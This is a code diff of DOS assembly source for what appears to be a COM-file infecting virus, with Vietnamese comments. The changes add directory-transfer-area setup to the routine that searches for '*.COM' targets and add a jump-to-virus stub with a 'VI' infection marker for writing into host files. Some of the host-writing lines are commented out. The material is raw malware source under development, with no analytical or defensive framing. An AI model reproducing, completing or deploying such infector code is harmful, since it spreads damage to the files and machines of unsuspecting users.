@@ -30,6 +30,12 @@ EXECUTE:
 ;    nop
            
 FIND_FILE:
+    push bp
+    sub sp,43H
+    mov bp,sp
+    mov dx,bp
+    mov ah,1AH
+    int 21H
     mov ah,4EH
     lea dx,[di+OFFSET COM_FILE]
     int 21H     
@@ -81,7 +87,7 @@ CHECK_FILE:              ; check 5 byte ban dau.
     int 21H  
     
 ;    mov cx,5                      ; set 5 bytes ghi vo host
-;    lea dx,[di+OFFSET START]      ; tai vi tri data_array
+;    lea dx,[di+OFFSET TEST_JMP]      ; tai vi tri data_array
 ;    mov ah,40H
 ;    int 21H                       ; ghi
     
@@ -98,7 +104,6 @@ DONE:
 ;    int 21H                              
 ;    mov si,offset START             ; restore 
 ;    push si
-;    lea si,[bp+TERMINATE]
 ;    movsw
 ;    movsw
 ;    movsb     
@@ -106,7 +111,9 @@ DONE:
         
     
 COM_FILE    DB      '*.COM',0
-
+TEST_JMP: 
+jmp near ptr START_VIRUS
+db 'VI'
         
 ENDVIR:  
 
